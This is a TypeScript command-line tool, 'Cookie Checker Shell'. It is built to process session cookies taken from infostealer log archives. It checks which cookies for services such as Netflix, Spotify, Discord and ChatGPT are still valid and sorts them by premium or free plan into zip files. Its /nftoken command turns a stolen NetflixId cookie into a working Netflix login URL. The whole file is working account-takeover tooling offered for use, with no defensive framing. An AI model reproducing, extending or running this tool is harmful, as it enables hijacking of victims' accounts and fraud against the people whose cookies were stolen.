#!/usr/bin/env node
/**
 * Cookie Checker Shell — interactive REPL with Telegram-style slash commands.
 *
 * Commands:
 *   /check  <file_or_url> [service_domain]
 *   /log    <file_or_url> <domain1> [domain2 ...]
 *   /nftoken <file_or_url>
 *   /services
 *   /help
 *   /exit
 *
 * Files can be local paths OR http/https CDN URLs — downloaded automatically.
 */

import * as readline from "readline";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { spawnSync } from "child_process";
import AdmZip from "adm-zip";
import chalk from "chalk";
import ora from "ora";
import axios from "axios";

import { checkCookie, getServiceList, type CookieCheckResult } from "./cookieChecker.js";
import { extractLogsFromDirectory, extractLogsForDomains } from "./logExtractor.js";
import { fetchNfToken, parseNetflixId } from "./nftoken.js";

// ─── Download helper ──────────────────────────────────────────────────────────

function isUrl(s: string): boolean {
  return /^https?:\/\//i.test(s);
}

async function downloadFile(url: string): Promise<{ buffer: Buffer; filename: string }> {
  const spin = ora(`Downloading ${url.split("/").pop() ?? "file"}…`).start();
  try {
    const res = await axios.get<ArrayBuffer>(url, {
      responseType: "arraybuffer",
      timeout: 120_000,
      maxContentLength: 500 * 1024 * 1024, // 500 MB
      headers: { "User-Agent": "Mozilla/5.0" },
    });
    const buffer = Buffer.from(res.data);
    // Try to pull a filename from Content-Disposition, then URL
    const cd = res.headers["content-disposition"] as string | undefined;
    const cdMatch = cd?.match(/filename[^;=\n]*=(?:(['"])([^'"]*)\1|([^;\n]*))/i);
    const filename =
      cdMatch?.[2] ?? cdMatch?.[3]?.trim() ?? decodeURIComponent(url.split("/").pop()?.split("?")[0] ?? "download");
    spin.succeed(`Downloaded ${filename}  (${(buffer.length / 1024 / 1024).toFixed(1)} MB)`);
    return { buffer, filename };
  } catch (err) {
    spin.fail(`Download failed: ${(err as Error).message}`);
    throw err;
  }
}

/** Resolve a local path or CDN URL into a { buffer, filename, tmpPath? }.
 *  tmpPath is set when we wrote a temp file (caller must clean up). */
async function resolveFile(
  arg: string,
): Promise<{ buffer: Buffer; filename: string; tmpPath?: string }> {
  if (isUrl(arg)) {
    const { buffer, filename } = await downloadFile(arg);
    // Write to tmp so extractArchive can reference it by path
    const tmpPath = path.join(os.tmpdir(), `ccshell_${Date.now()}_${filename}`);
    fs.writeFileSync(tmpPath, buffer);
    return { buffer, filename, tmpPath };
  }
  const absPath = path.resolve(arg);
  if (!fs.existsSync(absPath)) throw new Error(`File not found: ${arg}`);
  const buffer = fs.readFileSync(absPath);
  return { buffer, filename: path.basename(absPath), tmpPath: absPath };
}

// ─── Archive extraction ───────────────────────────────────────────────────────

function extractArchiveToDir(srcPath: string, destDir: string): void {
  const ext = path.extname(srcPath).toLowerCase();
  const r = spawnSync("7z", ["x", "-p-", `-o${destDir}`, srcPath, "-y", "-bso0", "-bsp0"], {
    stdio: "ignore",
    timeout: 300_000,
  });
  if (r.status !== 0) {
    if (ext === ".zip") {
      new AdmZip(srcPath).extractAllTo(destDir, true);
    } else {
      throw new Error(
        `Archive extraction failed.\nInstall 7z: apt install p7zip-full  OR  brew install p7zip`,
      );
    }
  }
}

// ─── Output helpers ───────────────────────────────────────────────────────────

function saveZip(entries: Array<{ name: string; content: string }>, outPath: string): void {
  const zip = new AdmZip();
  for (const e of entries) zip.addFile(e.name, Buffer.from(e.content, "utf-8"));
  zip.writeZip(outPath);
}

function printCookieResult(r: CookieCheckResult): void {
  if (r.valid) {
    const tier = r.plan === "premium" ? chalk.yellow("👑 Premium") : chalk.green("🆓 Free");
    const who = [r.accountName, r.accountEmail].filter(Boolean).join(" / ");
    console.log(`  ${chalk.green("✔")} ${r.filename}  ${tier}  ${chalk.dim(who || "")}`);
  } else {
    console.log(`  ${chalk.red("✘")} ${r.filename}  ${chalk.dim(r.error ?? "Invalid")}`);
  }
}

// ─── Command handlers ─────────────────────────────────────────────────────────

async function cmdCheck(args: string[]): Promise<void> {
  if (args.length === 0) {
    console.log(chalk.yellow("  Usage: /check <file_or_url> [service_domain]"));
    console.log(chalk.dim("  Example: /check cookies.zip"));
    console.log(chalk.dim("  Example: /check https://cdn.example.com/cookies.zip netflix.com"));
    return;
  }

  const [fileArg, serviceArg] = args;
  let resolved: Awaited<ReturnType<typeof resolveFile>> | null = null;

  try {
    resolved = await resolveFile(fileArg!);
  } catch (err) {
    console.log(chalk.red(`  ✘ ${(err as Error).message}`));
    return;
  }

  const { buffer, filename, tmpPath } = resolved;
  const isZip = filename.toLowerCase().endsWith(".zip");

  // Build list of { name, content } entries
  const entries: Array<{ name: string; content: string }> = [];
  if (isZip) {
    try {
      const zip = new AdmZip(buffer);
      for (const e of zip.getEntries()) {
        if (!e.isDirectory && /\.(txt|json|cookies?|log)$/i.test(e.name)) {
          entries.push({ name: e.name, content: e.getData().toString("utf-8") });
        }
      }
    } catch {
      console.log(chalk.red("  ✘ Could not open ZIP archive."));
      return;
    }
  } else {
    entries.push({ name: filename, content: buffer.toString("utf-8") });
  }

  if (entries.length === 0) {
    console.log(chalk.red("  ✘ No cookie files found (.txt .json .cookies .log)"));
    return;
  }

  const svcLabel = serviceArg ?? "auto-detect";
  const spin = ora(`Checking ${entries.length} file(s) — service: ${svcLabel}`).start();

  const results: CookieCheckResult[] = [];
  for (let i = 0; i < entries.length; i++) {
    const e = entries[i]!;
    const r = await checkCookie(e.name, e.content, serviceArg && serviceArg !== "auto" ? serviceArg : undefined);
    results.push(r);
    spin.text = `Checking ${i + 1}/${entries.length}…`;
  }
  spin.stop();

  const valid = results.filter((r) => r.valid);
  const invalid = results.filter((r) => !r.valid);

  console.log(
    `\n  ${chalk.green.bold(`✔ ${valid.length} valid`)}  ${chalk.red(`✘ ${invalid.length} invalid`)}  ${chalk.dim(`of ${results.length} total`)}\n`,
  );
  results.forEach(printCookieResult);

  if (valid.length === 0) {
    console.log(chalk.dim("\n  No valid cookies — nothing saved.\n"));
    return;
  }

  // Save valid cookies grouped by service + plan
  const outDir = "output";
  fs.mkdirSync(outDir, { recursive: true });
  const groups = new Map<string, Array<{ name: string; content: string }>>();
  for (let i = 0; i < results.length; i++) {
    const r = results[i]!;
    if (!r.valid) continue;
    const key = `${r.service}_${r.plan ?? "checked"}`.replace(/\W+/g, "_").toLowerCase();
    if (!groups.has(key)) groups.set(key, []);
    groups.get(key)!.push(entries[i]!);
  }
  console.log();
  for (const [key, items] of groups) {
    const zipPath = path.join(outDir, `${key}.zip`);
    saveZip(items, zipPath);
    console.log(`  ${chalk.cyan("📦")} ${items.length} cookie(s) → ${chalk.underline(zipPath)}`);
  }
  console.log();

  // Cleanup temp file if we downloaded from URL
  if (isUrl(fileArg!) && tmpPath) {
    try { fs.unlinkSync(tmpPath); } catch { /* */ }
  }
}

async function cmdLog(args: string[]): Promise<void> {
  if (args.length < 2) {
    console.log(chalk.yellow("  Usage: /log <file_or_url> <domain1> [domain2 ...]"));
    console.log(chalk.dim("  Example: /log logs.zip netflix.com spotify.com"));
    console.log(chalk.dim("  Example: /log https://cdn.example.com/logs.rar netflix.com"));
    return;
  }

  const [fileArg, ...domainArgs] = args;
  const domains = domainArgs
    .flatMap((d) => d.split(","))
    .map((d) => d.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/^www\./, ""))
    .filter(Boolean);

  if (domains.length === 0) {
    console.log(chalk.red("  ✘ No valid domains. Example: /log logs.zip netflix.com spotify.com"));
    return;
  }

  console.log(`\n  Domains: ${chalk.cyan(domains.join(", "))}\n`);

  let resolved: Awaited<ReturnType<typeof resolveFile>> | null = null;
  try {
    resolved = await resolveFile(fileArg!);
  } catch (err) {
    console.log(chalk.red(`  ✘ ${(err as Error).message}`));
    return;
  }

  const { buffer, filename, tmpPath } = resolved;
  const ext = path.extname(filename).toLowerCase();

  let report: Awaited<ReturnType<typeof extractLogsForDomains>>;

  if (ext === ".zip") {
    const spin = ora("Scanning ZIP archive…").start();
    try {
      report = extractLogsForDomains(buffer, domains);
      spin.stop();
    } catch (err) {
      spin.fail(`Failed: ${(err as Error).message}`);
      return;
    }
  } else {
    // RAR / 7z — need to extract to temp dir
    const srcPath = tmpPath!;
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "cclog-"));
    const spin = ora("Extracting archive…").start();
    try {
      extractArchiveToDir(srcPath, tmpDir);
      spin.text = "Scanning files…";
      report = extractLogsFromDirectory(tmpDir, domains);
      spin.stop();
    } catch (err) {
      spin.fail(`Failed: ${(err as Error).message}`);
      return;
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  }

  // Cleanup downloaded temp file
  if (isUrl(fileArg!) && tmpPath) {
    try { fs.unlinkSync(tmpPath); } catch { /* */ }
  }

  if (report.services.length === 0) {
    console.log(
      chalk.yellow("  ⚠  No cookies found for those domains.\n") +
      chalk.dim(`     Files scanned: ${report.totalFilesScanned}  ·  Total cookies in archive: ${report.totalCookiesFound}`),
    );
    return;
  }

  console.log(
    `  ${chalk.green.bold(`✔ ${report.totalCookiesFound} cookies`)} across ` +
    `${chalk.bold(String(report.services.length))} domain(s)  ` +
    chalk.dim(`(${report.totalFilesScanned} files scanned)\n`),
  );

  for (const svc of report.services) {
    console.log(`  ${chalk.cyan("●")} ${chalk.bold(svc.domain)}  ${svc.files.length} session(s), ${svc.totalDomainCookies} cookie(s)`);
  }

  const outDir = "output";
  fs.mkdirSync(outDir, { recursive: true });
  console.log();
  for (const svc of report.services) {
    const zipPath = path.join(outDir, `${svc.domain}.zip`);
    const entries = svc.files.map((f, i) => ({ name: `${svc.domain}_${i + 1}.txt`, content: f.domainContent }));
    saveZip(entries, zipPath);
    console.log(`  ${chalk.cyan("📦")} ${svc.domain}  →  ${chalk.underline(zipPath)}`);
  }
  console.log();
}

async function cmdNftoken(args: string[]): Promise<void> {
  if (args.length === 0) {
    console.log(chalk.yellow("  Usage: /nftoken <file_or_url>"));
    console.log(chalk.dim("  Example: /nftoken netflix_cookies.txt"));
    console.log(chalk.dim("  Example: /nftoken https://cdn.example.com/netflix.txt"));
    return;
  }

  let content: string;
  const fileArg = args[0]!;

  try {
    const { buffer, tmpPath, filename } = await resolveFile(fileArg);
    content = buffer.toString("utf-8");
    if (isUrl(fileArg) && tmpPath) {
      try { fs.unlinkSync(tmpPath); } catch { /* */ }
    }
  } catch (err) {
    console.log(chalk.red(`  ✘ ${(err as Error).message}`));
    return;
  }

  const netflixId = parseNetflixId(content);
  if (!netflixId) {
    console.log(
      chalk.red("  ✘ NetflixId cookie not found.\n") +
      chalk.dim("    Make sure the file is a Netscape .txt, JSON array, or raw cookie string."),
    );
    return;
  }

  console.log(`\n  ${chalk.dim("NetflixId:")} ${chalk.dim(netflixId.slice(0, 32) + "…")}\n`);
  const spin = ora("Calling Netflix iOS API…").start();

  try {
    const result = await fetchNfToken(content);
    spin.stop();
    console.log(`  ${chalk.green("✔")} ${chalk.bold("Netflix Login URL:")}\n`);
    console.log(`  ${chalk.cyan.underline(result.url)}\n`);
    if (result.expiresAt && result.expiresInMinutes !== null) {
      const ttl =
        result.expiresInMinutes > 60
          ? `${Math.round(result.expiresInMinutes / 60)}h ${result.expiresInMinutes % 60}m`
          : `${result.expiresInMinutes} min`;
      console.log(`  ${chalk.dim("Expires in:")} ${chalk.yellow(ttl)}  ${chalk.dim(`(${result.expiresAt.toUTCString()})`)}\n`);
    }
    console.log(chalk.dim("  Tip: Open in Chrome/Safari — not in Telegram or any in-app browser.\n"));
  } catch (err) {
    spin.fail(`${(err as Error).message}`);
  }
}

function cmdServices(): void {
  const list = getServiceList();
  console.log(`\n  ${chalk.bold(String(list.length))} supported services:\n`);
  for (const s of list) {
    console.log(`  ${s.emoji}  ${chalk.bold(s.name.padEnd(20))} ${chalk.dim(s.domain)}`);
  }
  console.log();
}

function cmdHelp(): void {
  console.log(`
  ${chalk.bold("Commands:")}

  ${chalk.cyan("/check")}  <file_or_url> [service]
        Validate cookies. File can be .txt/.json/.zip or a CDN URL.
        Service is optional (auto-detected if omitted).

  ${chalk.cyan("/log")}  <file_or_url> <domain1> [domain2 ...]
        Extract domain cookies from stealer log archives.
        Supports .zip, .rar, .7z — local file or CDN URL.

  ${chalk.cyan("/nftoken")}  <file_or_url>
        Generate a Netflix login URL from a NetflixId cookie.

  ${chalk.cyan("/services")}
        List all supported services.

  ${chalk.cyan("/help")}
        Show this help.

  ${chalk.cyan("/exit")}  or  ${chalk.cyan("/quit")}
        Exit the shell.

  ${chalk.bold("Examples:")}
  ${chalk.dim("/check cookies.zip")}
  ${chalk.dim("/check netflix.txt netflix.com")}
  ${chalk.dim("/check https://cdn.example.com/cookies.zip")}
  ${chalk.dim("/log logs.zip netflix.com spotify.com discord.com")}
  ${chalk.dim("/log https://cdn.example.com/logs.rar chatgpt.com")}
  ${chalk.dim("/nftoken netflix_cookies.txt")}
  ${chalk.dim("/nftoken https://cdn.example.com/netflix.txt")}
`);
}

// ─── REPL ─────────────────────────────────────────────────────────────────────

async function runCommand(line: string): Promise<void> {
  const trimmed = line.trim();
  if (!trimmed) return;

  const [cmd, ...rest] = trimmed.split(/\s+/);

  switch (cmd?.toLowerCase()) {
    case "/check":   await cmdCheck(rest); break;
    case "/log":     await cmdLog(rest); break;
    case "/nftoken": await cmdNftoken(rest); break;
    case "/services": cmdServices(); break;
    case "/help":    cmdHelp(); break;
    case "/exit":
    case "/quit":
      console.log(chalk.dim("\n  Bye!\n"));
      process.exit(0);
      break;
    default:
      console.log(chalk.yellow(`  Unknown command: ${cmd}. Type /help to see available commands.\n`));
  }
}

async function main(): Promise<void> {
  // ── Non-interactive mode: pass command directly as args ──
  // e.g.  node cli.js /log logs.zip netflix.com
  if (process.argv.length > 2) {
    const line = process.argv.slice(2).join(" ");
    await runCommand(line);
    return;
  }

  // ── Interactive REPL mode ──
  console.log(chalk.cyan.bold("\n  Cookie Checker Shell"));
  console.log(chalk.dim("  ────────────────────────────────────────"));
  console.log(chalk.dim("  Type /help to see commands, /exit to quit\n"));

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: chalk.green("  > "),
    terminal: true,
  });

  rl.prompt();

  rl.on("line", async (line) => {
    rl.pause();
    await runCommand(line);
    rl.resume();
    rl.prompt();
  });

  rl.on("close", () => {
    console.log(chalk.dim("\n  Bye!\n"));
    process.exit(0);
  });
}

main().catch((err) => {
  console.error(chalk.red(`\n  Fatal error: ${(err as Error).message}\n`));
  process.exit(1);
});
